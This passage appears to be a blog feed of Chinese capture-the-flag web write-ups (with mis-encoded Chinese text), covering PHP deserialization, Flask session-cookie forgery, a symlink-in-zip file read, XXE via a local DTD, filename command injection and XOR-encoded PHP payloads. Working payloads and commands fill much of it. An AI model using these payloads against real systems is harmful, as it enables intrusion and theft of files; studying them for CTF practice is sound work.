class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5 success&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1 success&quot;</span>;&#125;</code></pre><p>æµ‹è¯•ç»“æœ<br><code>$a = new Error(&quot;llnn&quot;,1);</code>å’Œ<code>$b = new Error(&quot;llnn&quot;,2);</code>ä¸åœ¨ä¸€è¡Œçš„è¯<code>md5</code>å’Œ<code>sha1</code>æ˜¯ä¸ç­‰çš„ </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      </p><p>è€Œä¸”<code>llnn</code>é‚£é‡Œï¼Œä¹Ÿå°±æ˜¯Errorç±»çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·ï¼š<code>?&gt;&lt;?=phpinfo();?&gt;</code>ä½†æœ‰è¿‡æ»¤ï¼Œå°æ‹¬å·å’Œ<code>/</code>éƒ½ä¸èƒ½ç”¨ï¼Œå¯ä»¥ç›´æ¥<code>include /flag</code>;å°†<code>/flag</code>urlç¼–ç å–åç»•è¿‡</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payloadï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<span class="hljs-keyword">public</span> $syc;<span class="hljs-keyword">public</span> $lover;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c))); <span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SWPU2019 Web3</title>
    <link href="/2021/09/05/BUU92/"/>
    <url>/2021/09/05/BUU92/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>æ‰“å¼€ç¯å¢ƒ<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>éšä¾¿ç™»ä¸ªadmin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>ç‚¹å‡»<code>upload</code>ä¼šå¾—åˆ°<code>Permission denied!</code><br>æ³¨æ„åˆ°ç½‘ç«™æ ‡é¢˜æ˜¯<code>CTF-Flask-Demo</code>,æ‰€ä»¥å»è§£ä¸€ä¸‹session<br>è§£å¯†è„šæœ¬ï¼š</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-comment"># flask-session-cookie-manager-master  ä¹Ÿèƒ½è§£session</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>ä¹‹åä¼ªé€ cookie,è®©idä¸º<code>b&#39;1&#39;</code>,éœ€è¦key</p><p>ç„¶åï¼Œå¦‚æœè®¿é—®ç½‘ç«™ä¸å­˜åœ¨çš„è·¯ç”±ä¼šè¿”å›<code>404 not found</code>ä½†statusæ˜¯200ï¼Œåœ¨å“åº”å¤´é‡Œæœ‰ï¼š<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64è§£ç åå¾—åˆ°ï¼š<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>ç„¶åç”¨<code>flask-session-cookie-manager</code>åŠ å¯†å³å¯</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>é¡µé¢æ›´æ¢cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>å¾—åˆ°æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œä¸”æ³¨é‡Šä¸­æœ‰æºç </p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:        <span class="hljs-keyword">return</span> render_template_string(temp)    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:        m = hashlib.md5()        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        m.update(name)        md5_one= m.hexdigest()        n = hashlib.md5()        ip = request.remote_addr        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        n.update(ip)        md5_ip = n.hexdigest()        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        basepath=os.path.dirname(os.path.realpath(__file__))        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>        filename = f.filename        pathname = path+filename        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">-1</span>]:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):            <span class="hljs-keyword">try</span>:                os.makedirs(path_base)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):            <span class="hljs-keyword">try</span>:                os.makedirs(path)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):            <span class="hljs-keyword">try</span>:                f.save(pathname)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">try</span>:            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != <span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != <span class="hljs-number">-1</span>:waf()                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            os.system(cmd)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != <span class="hljs-number">-1</span>:                shutil.rmtree(path_base)                os.mkdir(path_base)                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()            resp = make_response(image)            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>            <span class="hljs-keyword">return</span> resp        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            shutil.rmtree(path_base)            os.mkdir(path_base)            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/showflag&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()        resp = make_response(image)        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre><p>ä¸¤ä¸ªè·¯ç”±ï¼Œç¬¬ä¸€ä¸ªè¦æ±‚ä¸Šä¼ ä¸ªå›¾ç‰‡å‹ç¼©åŒ…ï¼Œç¬¬äºŒä¸ªè¯´æ˜flagåœ¨flaskæ ¹ç›®å½•ä¸‹çš„flagé‡Œçš„flag.jpgä¸­</p><p><code>showflag()</code>è·¯ç”±çš„<code>True==False</code>æ˜¯æ’<code>False</code>çš„ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ç¬¬äºŒä¸ªè·¯ç”±æ‹¿åˆ°flagï¼Œè¿™é‡Œé€šè¿‡ç¬¬ä¸€ä¸ªè·¯ç”±ä¸Šä¼ ä¸ªè½¯é“¾æ¥è¯»å–æ–‡ä»¶      </p><p><code>ln -s</code>æ˜¯Linuxçš„ä¸€ç§è½¯è¿æ¥ï¼Œç›¸å½“äºWindowsçš„å¿«æ·æ–¹å¼<br>æ¯”å¦‚</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]â””â”€# ln -s /etc/passwd test       </code></pre><p>æ‰“å¼€<code>test</code>ä¸­å°±æ˜¯<code>/etc/passwd</code>ä¸­çš„å†…å®¹äº†        </p><p><code>/proc/self</code> è®°å½•äº†ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ç­‰,<code>cwd</code>æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥,å³flaskè¿è¡Œè¿›ç¨‹ç›®å½•      </p><p>payload:   </p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# ln -s /proc/self/cwd/flag/flag.jpg testâ”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# zip -ry test.zip test</code></pre><p>ç„¶åå°†<code>test.zip</code>ä¸Šä¼ å³å¯å¾—åˆ°flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>flask</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bnv</title>
    <link href="/2021/08/01/BUU91/"/>
    <url>/2021/08/01/BUU91/</url>
    
    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>æŠ“åŒ…   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>å°è¯•sqliï¼Œä¸è¡Œ<br>æœ‰jsonçš„åœ°æ–¹å¯èƒ½å­˜åœ¨<code>xxe</code><br><code>Content-type</code>æ”¹ä¸º<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>è¿”å›<code>No result found</code>     </p><p>çœ‹æ¥ä¸è¡Œ    </p><p>WPï¼š</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>åˆ©ç”¨æœ¬åœ°DTDæ–‡ä»¶è¿›è¡ŒXXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>xxe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Eating_cms</title>
    <link href="/2021/08/01/BUU90/"/>
    <url>/2021/08/01/BUU90/</url>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-è§£ææ¼æ´"><a href="#parse-url-è§£ææ¼æ´" class="headerlink" title="parse_url()è§£ææ¼æ´"></a><code>parse_url()</code>è§£ææ¼æ´</h4><ul><li><p><code>function.php</code>ä¸­</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<span class="hljs-comment">//    var_dump($query);</span><span class="hljs-comment">//    die();</span>    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)    &#123;        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)        &#123;            <span class="hljs-keyword">if</span> (stristr($k, $token))                hacker();            <span class="hljs-keyword">if</span> (stristr($v, $token))                hacker();        &#125;    &#125;&#125;</code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>è¿™æ ·å°±ä¼šè¢«åŒ¹é…åˆ°ï¼Œä¸èƒ½è¯»å–ï¼›ä½†æ˜¯å¦‚æœè¿™æ ·<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_urlå°±ä¼šè¿”å›<code>false</code>ï¼›è¯»å–æˆåŠŸã€‚</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>æ¼æ´é—®é¢˜åªå­˜åœ¨äºphp5.4.7ä»¥å‰</strong></p><hr><p>çœŸæ­£çš„ä¸Šä¼ åœ°å€<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload fileï¼&quot;</span>);&#125;$newfile = $path.$filename;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $filename;$picdata = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);  <span class="hljs-comment">//systemå‘½ä»¤æ‰§è¡Œï¼ŒæŠ“åŒ…æ”¹filenameå³å¯</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payloadï¼š</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>æˆ–è€…*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`ls /|| `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d` cat /flag_233333</code></pre></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼‚æˆ–^</title>
    <link href="/2021/07/14/%E5%BC%82%E6%88%96/"/>
    <url>/2021/07/14/%E5%BC%82%E6%88%96/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h1><p>å¼‚æˆ–å°±æ˜¯äºŒè¿›åˆ¶å¯¹åº”ä½ä¸Šè¿ç®—ï¼š   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ffå¯¹åº”çš„æ˜¯åè¿›åˆ¶çš„255ï¼ŒäºŒè¿›åˆ¶å°±æ˜¯<code>111111111</code>,æ‰€ä»¥å®ƒä¸å…¶ä»–å¼‚æˆ–åå†ä¸åŸæ¥çš„å¼‚æˆ–å°±ç­‰äºåŸæ¥çš„<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;phpinfo&#x27;</span>     <span class="hljs-comment">##è¦å¼‚æˆ–çš„</span>temp=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    temp.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)),<span class="hljs-number">16</span>)^<span class="hljs-number">0xff</span>))<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:    print(j.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)print(<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-string">&#x27;%ff&#x27;</span>*<span class="hljs-built_in">len</span>(temp))</code></pre></code></pre><p><code>phpinfo</code>â€”-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>â€”-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(æ¯ä¸€éƒ¨åˆ†éƒ½è¦æ‹¬èµ·æ¥)     </p><h2 id="æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯"><a href="#æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯" class="headerlink" title="æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯"></a>æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯</h2><p>æ¯”å¦‚:    </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);</code></pre></code></pre><p>è¿™ä¸ªæ˜¯é™å®šæ‰€ç”¨çš„å­—ç¬¦ç§ç±»å°äºæˆ–ç­‰äº13       </p><p>çœ‹çœ‹æœ‰æ²¡æœ‰é‚£ä¸ªå­—ç¬¦å¯ä»¥ç”±å…¶å®ƒçš„å¼‚æˆ–è€Œæ¥    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;\&#x27;().;_acdinprst&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res:        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> res:            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> res:                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(j)^<span class="hljs-built_in">ord</span>(m)^<span class="hljs-built_in">ord</span>(n)==<span class="hljs-built_in">ord</span>(i)):                    <span class="hljs-keyword">if</span>(j==m <span class="hljs-keyword">or</span> j==n <span class="hljs-keyword">or</span> m==n):                        <span class="hljs-keyword">continue</span>                    <span class="hljs-keyword">else</span>:                        print(i+<span class="hljs-string">&#x27;==&#x27;</span>+j+<span class="hljs-string">&#x27;^&#x27;</span>+m+<span class="hljs-string">&#x27;^&#x27;</span>+n)</code></pre></code></pre><p>è¿™é‡Œç”¨ä¸‰ä¸ªæ¥å¼‚æˆ–ä¸€ä¸ªï¼Œä¸¤ä¸ªçš„è¯å¤ªå°‘ï¼Œä¸è¡Œ<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>éšä¾¿é€‰ä¸‰ä¸ª   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>â€”&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>â€”-&gt;åŠ 